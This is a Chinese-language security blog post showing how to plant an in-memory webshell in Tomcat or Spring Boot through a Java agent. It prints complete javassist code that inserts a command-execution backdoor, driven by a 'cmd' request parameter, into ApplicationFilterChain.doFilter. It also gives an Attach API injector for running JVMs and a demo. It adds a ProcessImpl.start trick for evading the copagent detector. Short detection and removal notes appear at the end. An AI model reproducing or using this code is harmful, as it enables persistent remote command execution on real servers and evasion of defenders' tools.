<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>字节码插桩技术在内存马中的应用 - P1n93r - 博学而精一</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="P1n93r" /><meta name="description" content="认识JavaAgent 在jdk的rt.jar包中存在一个 java.lang.instrument 包。 java Instrumentation 指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在J" /><meta name="keywords" content="Security, Java, Web, Android" />






<meta name="generator" content="Hugo 0.96.0 with theme even" />


<link rel="canonical" href="https://p1n93r.github.io/post/security/%E5%AD%97%E8%8A%82%E7%A0%81%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E5%9C%A8%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="字节码插桩技术在内存马中的应用" />
<meta property="og:description" content="认识JavaAgent 在jdk的rt.jar包中存在一个 java.lang.instrument 包。 java Instrumentation 指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在J" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://p1n93r.github.io/post/security/%E5%AD%97%E8%8A%82%E7%A0%81%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E5%9C%A8%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-06-15T17:07:36+08:00" />
<meta property="article:modified_time" content="2021-06-15T17:07:36+08:00" />

<meta itemprop="name" content="字节码插桩技术在内存马中的应用">
<meta itemprop="description" content="认识JavaAgent 在jdk的rt.jar包中存在一个 java.lang.instrument 包。 java Instrumentation 指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在J"><meta itemprop="datePublished" content="2021-06-15T17:07:36+08:00" />
<meta itemprop="dateModified" content="2021-06-15T17:07:36+08:00" />
<meta itemprop="wordCount" content="2273">
<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="字节码插桩技术在内存马中的应用"/>
<meta name="twitter:description" content="认识JavaAgent 在jdk的rt.jar包中存在一个 java.lang.instrument 包。 java Instrumentation 指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在J"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">P1n93r</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">P1n93r</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/categories/">Categories</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">About</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">字节码插桩技术在内存马中的应用</h1>

      <div class="post-meta">
        <span class="post-time"> 2021-06-15 </span>
        <div class="post-category">
            <a href="/categories/security/"> security </a>
            </div>
          <span class="more-meta"> 约 2273 字 </span>
          <span class="more-meta"> 预计阅读 5 分钟 </span>
        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#认识javaagent">认识JavaAgent</a></li>
        <li><a href="#agentmain方式">agentmain方式</a>
          <ul>
            <li><a href="#准备agentjar">准备agent.jar</a></li>
            <li><a href="#准备attack-agentjar到目标jvm">准备attack agent.jar到目标JVM</a></li>
          </ul>
        </li>
        <li><a href="#成果演示">成果演示</a></li>
        <li><a href="#内存马检测">内存马检测</a></li>
        <li><a href="#内存马卸载">内存马卸载</a></li>
        <li><a href="#参考链接">参考链接</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <h2 id="认识javaagent">认识JavaAgent</h2>
<p>在jdk的rt.jar包中存在一个 <code>java.lang.instrument</code> 包。</p>
<p><code>java Instrumentation</code> 指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在JVM上的应用程序。这种监测和协助包括但不限于获取JVM运行时状态，替换和修改类定义等。简单一句话概括下：<strong>Java Instrumentation可以在JVM启动后，动态修改已加载或者未加载的类，包括类的属性、方法。</strong></p>
<p>一些说明如下：</p>
<ul>
<li><code>javaagent</code> 是java命令的一个参数，用于指定一个jar包；</li>
<li>JavaAgent的使用存在两种方式：premain（JVM启动前加载）和agentmain（JVM启动后加载）；</li>
</ul>
<p>premain和agentmain的函数声明如下所示，拥有 <code>Instrumentation inst</code> 参数的方法优先级更高：</p>
<pre><code>public static void agentmain(String agentArgs, Instrumentation inst) {
    ...
}

public static void agentmain(String agentArgs) {
    ...
}

public static void premain(String agentArgs, Instrumentation inst) {
    ...
}

public static void premain(String agentArgs) {
    ...
}
</code></pre>
<p>第一个参数 <code>String agentArgs</code> 就是Java agent的参数。例如 <code>java -jar xxx.jar -javaagent:out\artifacts\menshell_jar\menshell.jar=P1n93r</code> 中的 <code>P1n93r</code> 。</p>
<h2 id="agentmain方式">agentmain方式</h2>
<p>这里不讨论premain方式，因为premain方式需要 <strong>在启动时指定javaagent参数进行使用</strong> 。对于注入内存马来讲，靶机的WEB应用已经启动了，无法再使用premain方式进行注入；</p>
<p>首先明确注入内存马的步骤：</p>
<ol>
<li>准备一个agent.jar（agentmain方式），功能就是使用javassist技术修改某个类的字节码，以此添加内存马的功能；</li>
<li>因为目标系统已经启动了，为了实现启动后加载，可以使用 <code>Attach API</code> 将agent.jar attach到目标JVM中；</li>
<li>agent.jar作为JVM的代理程序成功执行，可以修改某个类的字节码，从而注入内存马。</li>
</ol>
<h3 id="准备agentjar">准备agent.jar</h3>
<p>首先准备一个agentmain方式的agent.jar，用来修改Tomcat中的 <code>org.apache.catalina.core.ApplicationFilterChain</code> 类字节码，为其添加webshell的功能；</p>
<p>创建新项目，结构如下所示（忽略其中的 `` ，这个包是其他的测试代码）：</p>
<p><img src="/media/2021-07-16-1.png" alt=""></p>
<p>其中，类 <code>AgentMainTest</code> 需要实现 <code>agentmain(String agentArgs, Instrumentation instrumentation)</code> 方法；且需要在 <code>src\main\META-INF\MANIFEST.MF</code> 中指定 <code>Agent-Class: AgentMainTest</code> 。如下图所示：</p>
<p><img src="/media/2021-07-16-2.png" alt=""></p>
<p>在 <code>AgentMainTest#agentmain()</code> 中实现对特定类进行字节码修改。在修改之前，先普及一下 <code>Instrumentation</code> 的几个需要用到的方法：</p>
<ul>
<li><code>Instrumentation#addTransformer(ClassFileTransformer transformer)</code> 方法：从当前时间开始，后续所有的类在进行加载前，需要先经过此方法配置的Transformer来进行字节码转换；</li>
<li><code>retransformClasses(Class&lt;?&gt;... classes)</code> 方法：该方法是JDK1.6后添加的。对于已经加载过的类，可以执行retransformClasses()来重新触发Transformer。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</li>
</ul>
<p>所以，一个简单的 <code>AgentMainTest#agentmain()</code> 实现代码如下所示：</p>
<p><img src="/media/2021-07-16-3.png" alt=""></p>
<p>接下来就是 <code>ClassFileTransformer</code> 的具体实现了，就是具体的字节码修改逻辑，一个参考如下：</p>
<pre><code>new ClassFileTransformer() {
    @SneakyThrows
    @Override
    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        // 因为获取的keyClass格式为：org/apache/catalina/core/ApplicationFilterChain，转一下
        className = className.replace('/', '.');
        // 找到待修改的目标类
        if (keyClass.equals(className)) {
            System.out.println(&quot;:::::::::::::::::::Find Key Class:&quot; + className + &quot;:::::::::::::::::::&quot;);
            // 接下来就是使用javassist修改目标类的字节码了
            ClassPool cp = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
                cp.insertClassPath(classPath);
            }
            CtClass cc = cp.get(className);
            // 修改目标类的doFilter方法
            CtMethod m = cc.getDeclaredMethod(&quot;doFilter&quot;);
            // 在方法前植入恶意代码
            m.insertBefore(&quot; javax.servlet.ServletRequest req = request;\n&quot; +
                    &quot;            javax.servlet.ServletResponse res = response;&quot; +
                    &quot;String cmd = req.getParameter(\&quot;cmd\&quot;);\n&quot; +
                    &quot;if (cmd != null) {\n&quot; +
                    &quot;Process process = Runtime.getRuntime().exec(cmd);\n&quot; +
                    &quot;java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n&quot; +
                    &quot;new java.io.InputStreamReader(process.getInputStream()));\n&quot; +
                    &quot;StringBuilder stringBuilder = new StringBuilder();\n&quot; +
                    &quot;String line;\n&quot; +
                    &quot;while ((line = bufferedReader.readLine()) != null) {\n&quot; +
                    &quot;stringBuilder.append(line + '\\n');\n&quot; +
                    &quot;}\n&quot; +
                    &quot;res.getOutputStream().write(stringBuilder.toString().getBytes());\n&quot; +
                    &quot;res.getOutputStream().flush();\n&quot; +
                    &quot;res.getOutputStream().close();\n&quot; +
                    &quot;}&quot;);
            byte[] byteCode = cc.toBytecode();
            cc.detach();
            return byteCode;
        }
        return classfileBuffer;
    }
};
</code></pre>
<p>逻辑就是：如果当前拦截的类为 <code>org.apache.catalina.core.ApplicationFilterChain</code> ，则使用javassist修改这个类的 <code>doFilter</code> 方法，在方法前添加恶意代码，从而植入webshell。</p>
<p>然后就可以使用IDEA将这个项目打包成jar了：</p>
<p><img src="/media/2021-07-16-4.png" alt=""></p>
<h3 id="准备attack-agentjar到目标jvm">准备attack agent.jar到目标JVM</h3>
<p>前面我们已经准备好了恶意的agent.jar代理包，那么现在就需要将这个agent.jar加载到目标JVM中实现恶意的代理。前面说到，使用官方提供的 <code>Attack API</code> 即可实现。一个参考案例如下：</p>
<pre><code>/**
 * 运行时加载Agent,目标启动JVM后动态注入agent
 */
public static void main(String[] args) {
    // agent.jar的物理路径
    String agentPath = &quot;D:/P1n93r/workspace/menshell/out/artifacts/menshell_jar/menshell.jar&quot;;
    // 目标JVM的名称
    String targetJvmDisplayname = &quot;com.pinger.TestMain&quot;;
    try {
        java.io.File toolsJar = new java.io.File(System.getProperty(&quot;java.home&quot;).replaceFirst(&quot;jre&quot;, &quot;lib&quot;) + java.io.File.separator + &quot;tools.jar&quot;);
        java.net.URLClassLoader classLoader = (java.net.URLClassLoader) java.lang.ClassLoader.getSystemClassLoader();
        java.lang.reflect.Method add = java.net.URLClassLoader.class.getDeclaredMethod(&quot;addURL&quot;, new java.lang.Class[]{java.net.URL.class});
        add.setAccessible(true);
        add.invoke(classLoader, new Object[]{toolsJar.toURI().toURL()});
        Class&lt;?&gt; myVirtualMachine = classLoader.loadClass(&quot;com.sun.tools.attach.VirtualMachine&quot;);
        Class&lt;?&gt; myVirtualMachineDescriptor = classLoader.loadClass(&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;);
        java.lang.reflect.Method list = myVirtualMachine.getDeclaredMethod(&quot;list&quot;, new java.lang.Class[]{});
        java.util.List&lt;Object&gt; invoke = (java.util.List&lt;Object&gt;) list.invoke(null, new Object[]{});
        // 遍历所有JVM
        for (int i = 0; i &lt; invoke.size(); i++) {
            Object o = invoke.get(i);
            java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod(&quot;displayName&quot;, new Class[]{});
            Object name = displayName.invoke(o, new Object[]{});
            System.out.println(String.format(&quot;find jvm process name:[[[&quot; +&quot;%s&quot;+&quot;]]]&quot;, name.toString()));
            // 找到目标WEB服务器的JVM虚拟机，Tomcat是org.apache.catalina.startup.Bootstrap
            // 寻找准备attach的目标JVM
            if (name.toString().contains(targetJvmDisplayname)) {
                java.lang.reflect.Method attach = myVirtualMachine.getDeclaredMethod(&quot;attach&quot;, new Class[]{myVirtualMachineDescriptor});
                Object machine = attach.invoke(myVirtualMachine, new Object[]{o});
                java.lang.reflect.Method loadAgent = machine.getClass().getSuperclass().getSuperclass().getDeclaredMethod(&quot;loadAgent&quot;, new Class[]{String.class});
                loadAgent.invoke(machine, new Object[]{agentPath});
                java.lang.reflect.Method detach = myVirtualMachine.getDeclaredMethod(&quot;detach&quot;, new Class[]{});
                detach.invoke(machine, new Object[]{});
                System.out.println(&quot;inject tomcat done, break.&quot;);
                System.out.println(&quot;check url http://localhost:8080/?cmd=whoami&quot;);
                break;
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
}
</code></pre>
<h2 id="成果演示">成果演示</h2>
<p>首先我起一个简单的SpringBoot项目，是用IDEA起的，其JVM DisplayName包含： <code>com.pinger.TestMain</code> 字符串（当然，也可以使用PID连接到目标JVM）。</p>
<p><img src="/media/2021-07-16-5.png" alt=""></p>
<p>然后运行如下代码（当然，也可以打包成jar来执行），将agent.jar attack到目标JVM：</p>
<p><img src="/media/2021-07-16-6.png" alt=""></p>
<p>访问地址 <code>http://[ip]:[port]/?cmd=whoami</code> ，发现内存马已生效：</p>
<p><img src="/media/2021-07-16-7.png" alt=""></p>
<p>同时发现目标WEB系统中存在如下日志：</p>
<p><img src="/media/2021-07-16-8.png" alt=""></p>
<p>这条日志表明， <code>ApplicationFilterChain</code> 这个类，在SpringBoot启动后，如果没有访问url，此时这个类还没有被加载。此时经过agent.jar中的transform处理，修改其字节码，添加了恶意代码，然后再被加载。</p>
<h2 id="内存马检测">内存马检测</h2>
<p>可以参考LandGrey师傅的copagent工具。此外提一嘴，看了下copagent中，检测黑名单命令执行函数有： <code>ProcessBuilder</code> 和 <code>getRuntime</code> 。此时我们可以使用 <code>java.lang.ProcessImpl#start()</code> 进行绕过，如下所示：</p>
<pre><code>Class clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class);
method.setAccessible(true);
method.invoke(null, new String[]{&quot;calc&quot;}, null, null, null, false);
</code></pre>
<h2 id="内存马卸载">内存马卸载</h2>
<p>对于这种方式添加的内存马，在不重启的情况下。我觉得可以采用注入内存马同样的方式，在已知正常的代码（剔除恶意代码后的代码）的情况下，将正常的代码重新注入且覆盖（ <code>CtMethod#setBody()</code> 的方式）到目标方法。</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li><a href="https://f5.pm/go-72758.html">https://f5.pm/go-72758.html</a></li>
<li><a href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Ajavaagent/">http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Ajavaagent/</a></li>
<li><a href="https://www.cnblogs.com/nice0e3/p/14086165.html">https://www.cnblogs.com/nice0e3/p/14086165.html</a></li>
</ul>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">P1n93r</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
        2021-06-15
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      
      <nav class="post-nav">
        <a class="prev" href="/post/security/thymeleaf%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">Thymeleaf安全研究</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        <a class="next" href="/post/security/vulnstack2%E7%AC%94%E8%AE%B0/">
            <span class="next-text nav-default">vulnstack2笔记</span>
            <span class="next-text nav-mobile">下一篇</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        <div id="disqus_thread"></div>
    <script type="text/javascript">
    (function() {
      
      
      if (window.location.hostname === 'localhost') return;

      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      var disqus_shortname = 'p1n93r';
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
      <span class="division">|</span>
    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
  </div>

  <span class="copyright-year">
    &copy; 
    2019 - 
    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>








</body>
</html>
